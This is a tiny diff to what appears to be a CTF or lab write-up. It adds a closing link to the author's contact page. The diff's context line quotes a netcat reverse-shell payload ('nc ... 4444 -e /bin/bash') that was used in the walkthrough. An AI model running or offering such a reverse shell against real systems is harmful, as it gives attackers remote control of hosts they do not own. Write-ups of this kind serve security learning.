@@ -77,3 +77,5 @@ Using the payload `nc 10.10.***.*** 4444 -e /bin/bash` with the `print ln to ech
 
 ## Thanks for reading!
 Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).
+
+You can also find my other contacts on the [whoami](../about) page.
